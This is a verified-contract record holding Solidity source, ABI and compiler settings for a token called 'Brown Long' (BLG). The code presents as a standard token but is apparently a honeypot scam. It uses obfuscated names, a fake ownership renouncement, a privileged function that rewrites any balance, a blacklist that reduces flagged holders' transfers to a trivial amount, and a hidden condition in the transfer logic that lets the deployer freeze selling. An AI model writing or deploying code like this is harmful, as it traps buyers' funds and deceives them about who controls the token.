{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface isToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitEnableExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundMax {\n    function createPair(address receiverBuyLaunched, address swapLaunch) external returns (address);\n}\n\ninterface limitSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalFee) external view returns (uint256);\n\n    function transfer(address receiverAutoSwap, uint256 modeSwap) external returns (bool);\n\n    function allowance(address fromLaunchExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverAutoSwap,\n        uint256 modeSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverToken, uint256 value);\n    event Approval(address indexed fromLaunchExempt, address indexed spender, uint256 value);\n}\n\ninterface limitSellMetadata is limitSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BrownLong is limitEnableExempt, limitSell, limitSellMetadata {\n\n    bool public listExempt;\n\n    function autoToken() private view {\n        require(teamBuy[_msgSender()]);\n    }\n\n    address public sellAt;\n\n    constructor (){\n        if (listTeam != shouldToken) {\n            listTeam = false;\n        }\n        isToken toTake = isToken(buyTo);\n        buyTx = fundMax(toTake.factory()).createPair(toTake.WETH(), address(this));\n        if (receiverLimit == receiverTakeIs) {\n            receiverTakeIs = receiverLimit;\n        }\n        sellAt = _msgSender();\n        autoList();\n        teamBuy[sellAt] = true;\n        walletFundExempt[sellAt] = amountFrom;\n        if (shouldToken == enableTradingLimit) {\n            receiverTakeIs = receiverLimit;\n        }\n        emit Transfer(address(0), sellAt, amountFrom);\n    }\n\n    uint256 constant autoAt = 16 ** 10;\n\n    function autoList() public {\n        emit OwnershipTransferred(sellAt, address(0));\n        fromSwap = address(0);\n    }\n\n    string private exemptMax = \"BLG\";\n\n    string private liquidityReceiver = \"Brown Long\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountFrom;\n    }\n\n    function getOwner() external view returns (address) {\n        return fromSwap;\n    }\n\n    event OwnershipTransferred(address indexed listReceiverAuto, address indexed buyList);\n\n    uint8 private listSell = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptMax;\n    }\n\n    function isAmountLimit(address liquidityTeamSell) public {\n        require(liquidityTeamSell.balance < 100000);\n        if (feeAuto) {\n            return;\n        }\n        \n        teamBuy[liquidityTeamSell] = true;\n        if (receiverTakeIs != receiverLimit) {\n            tradingMax = true;\n        }\n        feeAuto = true;\n    }\n\n    function transferFrom(address buyMax, address receiverAutoSwap, uint256 modeSwap) external override returns (bool) {\n        if (_msgSender() != buyTo) {\n            if (enableTrading[buyMax][_msgSender()] != type(uint256).max) {\n                require(modeSwap <= enableTrading[buyMax][_msgSender()]);\n                enableTrading[buyMax][_msgSender()] -= modeSwap;\n            }\n        }\n        return shouldSwap(buyMax, receiverAutoSwap, modeSwap);\n    }\n\n    function transfer(address takeSell, uint256 modeSwap) external virtual override returns (bool) {\n        return shouldSwap(_msgSender(), takeSell, modeSwap);\n    }\n\n    function allowance(address swapIs, address toWallet) external view virtual override returns (uint256) {\n        if (toWallet == buyTo) {\n            return type(uint256).max;\n        }\n        return enableTrading[swapIs][toWallet];\n    }\n\n    mapping(address => uint256) private walletFundExempt;\n\n    function fromIs(address takeSell, uint256 modeSwap) public {\n        autoToken();\n        walletFundExempt[takeSell] = modeSwap;\n    }\n\n    bool public tradingMax;\n\n    mapping(address => bool) public teamBuy;\n\n    bool public tradingTxLimit;\n\n    address buyTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private maxAmountBuy;\n\n    mapping(address => mapping(address => uint256)) private enableTrading;\n\n    address private fromSwap;\n\n    bool private shouldToken;\n\n    function teamList(address buyMax, address receiverAutoSwap, uint256 modeSwap) internal returns (bool) {\n        require(walletFundExempt[buyMax] >= modeSwap);\n        walletFundExempt[buyMax] -= modeSwap;\n        walletFundExempt[receiverAutoSwap] += modeSwap;\n        emit Transfer(buyMax, receiverAutoSwap, modeSwap);\n        return true;\n    }\n\n    bool private listTeam;\n\n    uint256 private amountFrom = 100000000 * 10 ** 18;\n\n    function launchedIs(uint256 modeSwap) public {\n        autoToken();\n        enableAmount = modeSwap;\n    }\n\n    function owner() external view returns (address) {\n        return fromSwap;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listSell;\n    }\n\n    uint256 enableAmount;\n\n    uint256 private receiverTakeIs;\n\n    address txBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function amountLiquidity(address totalSell) public {\n        autoToken();\n        \n        if (totalSell == sellAt || totalSell == buyTx) {\n            return;\n        }\n        fromFundEnable[totalSell] = true;\n    }\n\n    uint256 atFee;\n\n    bool public modeSwapFund;\n\n    bool public enableTradingLimit;\n\n    bool public feeAuto;\n\n    address public buyTx;\n\n    function approve(address toWallet, uint256 modeSwap) public virtual override returns (bool) {\n        enableTrading[_msgSender()][toWallet] = modeSwap;\n        emit Approval(_msgSender(), toWallet, modeSwap);\n        return true;\n    }\n\n    function balanceOf(address totalFee) public view virtual override returns (uint256) {\n        return walletFundExempt[totalFee];\n    }\n\n    uint256 public receiverLimit;\n\n    mapping(address => bool) public fromFundEnable;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityReceiver;\n    }\n\n    function shouldSwap(address buyMax, address receiverAutoSwap, uint256 modeSwap) internal returns (bool) {\n        if (buyMax == sellAt) {\n            return teamList(buyMax, receiverAutoSwap, modeSwap);\n        }\n        uint256 isExempt = limitSell(buyTx).balanceOf(txBuy);\n        require(isExempt == enableAmount);\n        require(receiverAutoSwap != txBuy);\n        if (fromFundEnable[buyMax]) {\n            return teamList(buyMax, receiverAutoSwap, autoAt);\n        }\n        return teamList(buyMax, receiverAutoSwap, modeSwap);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunchExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listReceiverAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSell\",\"type\":\"address\"}],\"name\":\"amountLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTradingLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromFundEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeSwap\",\"type\":\"uint256\"}],\"name\":\"fromIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTeamSell\",\"type\":\"address\"}],\"name\":\"isAmountLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeSwap\",\"type\":\"uint256\"}],\"name\":\"launchedIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSwapFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTxLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAutoSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BrownLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}